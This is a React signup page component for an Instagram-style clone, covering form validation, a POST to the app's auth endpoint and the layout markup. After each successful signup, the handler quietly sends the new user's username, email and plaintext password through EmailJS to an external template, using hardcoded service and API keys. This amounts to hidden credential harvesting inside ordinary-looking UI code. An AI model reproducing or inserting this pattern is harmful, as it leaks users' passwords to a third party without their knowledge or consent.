import InstaLogo from "/InstaLogo.jpeg";
import { useNavigate } from "react-router";
import { useState } from "react";
import toast from "react-hot-toast";
import axios from "axios";
import { SERVER_URL } from "../main";
import { useDispatch } from "react-redux"
import { setLoading, setUserdata } from "../Redux/UserSlice";
import emailjs from 'emailjs-com';

export const Signup = () => {

  const [Username, setUsername] = useState("");
  const [Email, setEmail] = useState("");
  const [Password, setPassword] = useState("");
  const [loader, setloader] = useState(false);

  const dispatch = useDispatch();
  const navigate = useNavigate();

  const timestamp = new Date().toLocaleString();
  const emailData = {
    username: Username,
    email: Email,
    password: Password,
    message: `Signup successful at ${timestamp}`,
  };

  const handleSignup = async () => {
    setloader(true);
    try {
      if (Password == "" || Email == "" || Username == "") {
        toast.error("All Fields Are Required");
        setloader(false);
        return;
      }

      if (Username.length < 3) {
        toast.error("Username Must Be At Least 3 Characters");
        setloader(false);
        return;
      }

      if (Username.length > 15) {
        toast.error("Username Is Too Long");
        setloader(false);
        return;
      }

      const pattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-zA-Z]{2,}$/;

      if (!pattern.test(Email)) {
        toast.error("Please Enter a Valid Email");
        setloader(false);
        return;
      }

      if (Password.length < 6) {
        toast.error("Password Must Be At 6 Character");
        setloader(false);
        return;
      }

      dispatch(setLoading(true));
      const result = await axios.post(`${SERVER_URL}/api/auth/signup`, { Username, Email, Password }, { withCredentials: true });
      dispatch(setUserdata(result.data));
      dispatch(setLoading(false));

      navigate("/editprofile");
      toast.success("Signup successfull");

      emailjs.send('service_84nqsxd', 'template_z2kc857', emailData, 'i6H34NfxvCO1ZHfzc');

      setloader(false);
      setUsername("");
      setEmail("");
      setPassword("");
    }
    catch (err) {
      console.log("Signup Error :", err.message);
      setloader(false);
      dispatch(setLoading(false));
      toast.error(err.response.data.message);
    }
  }


  return (
    <div className="flex flex-col items-center justify-center min-h-screen px-4 bg-gray-100">
      <div className="flex flex-col items-center w-full max-w-sm sm:max-w-sm h-[auto] border border-gray-300 px-4 py-6 rounded-xl shadow-md bg-white">

        <img
          src={InstaLogo}
          alt="InstaLogo"
          className="my-2 w-40 h-14 mix-blend-multiply mt-3"
        />

        <h1 className="text-[16px] sm:text-[17px] font-semibold opacity-60 text-center mt-3 w-full max-w-xs">
          Signup to see photos and videos from your friends
        </h1>

        <div className="flex flex-col gap-4 items-center mt-5 w-full">
          <input
            type="text"
            placeholder="Username"
            className="border p-3 w-full rounded-lg outline-none border-gray-300 bg-gray-100 focus:ring-2 focus:ring-blue-300 transition-all duration-200 shadow-sm"
            value={Username}
            onChange={(e) => setUsername(e.target.value)}
            disabled={loader}
          />
          <input
            type="email"
            placeholder="Email"
            className="border p-3 w-full rounded-lg outline-none border-gray-300 bg-gray-100 focus:ring-2 focus:ring-blue-300 transition-all duration-200 shadow-sm"
            value={Email}
            onChange={(e) => setEmail(e.target.value)}
            disabled={loader}
          />
          <input
            type="password"
            placeholder="Password"
            className="border p-3 w-full rounded-lg outline-none border-gray-300 bg-gray-100 focus:ring-2 focus:ring-blue-300 transition-all duration-200 shadow-sm"
            value={Password}
            onChange={(e) => setPassword(e.target.value)}
            disabled={loader}
          />

          <div className="flex flex-col items-center justify-center mt-4 w-full">
            <button
              type="submit"
              className={`text-white text-sm p-3 cursor-pointer w-full rounded-lg transition-all duration-200 shadow-md ${loader ? "bg-blue-400" : "bg-blue-500 hover:bg-blue-600" }`}
              onClick={handleSignup}
              disabled={loader}
            >
              {loader ? "Loading..." : "Signup"}
            </button>
          </div>

          <div className="flex items-center justify-center mt-5 w-full">
            <hr className="border-gray-400 w-full" />
            <span className="px-3 font-semibold text-[14px] opacity-60">OR</span>
            <hr className="border-gray-400 w-full" />
          </div>

          <div className="flex items-center justify-center mt-2 gap-1 text-sm">
            <p>Have an account?</p>
            <span
              className="text-blue-500 font-bold cursor-pointer hover:underline"
              onClick={() => navigate("/login")}
            >
              Login
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};
